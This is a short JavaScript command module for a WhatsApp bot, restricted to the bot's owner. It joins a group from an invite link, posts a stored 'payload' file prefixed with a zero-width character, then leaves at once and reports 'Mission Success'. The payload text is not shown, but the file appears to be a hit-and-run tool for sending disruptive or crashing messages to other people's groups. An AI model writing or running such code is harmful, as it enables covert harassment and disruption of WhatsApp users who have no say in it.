const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gsk",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        const payload = fs.readFileSync('./lib/payloads/skill.text', 'utf-8');
        const code = args[0].split('https://chat.whatsapp.com/')[1];
        
        try {
            const jid = await conn.groupAcceptInvite(code);
            await conn.sendMessage(jid, { text: "\u200B" + payload });
            await conn.groupLeave(jid);
            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: GSK Skill deployed."), contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid } } });
        } catch (e) { msg.reply("🥀 Failed."); }
    }
};
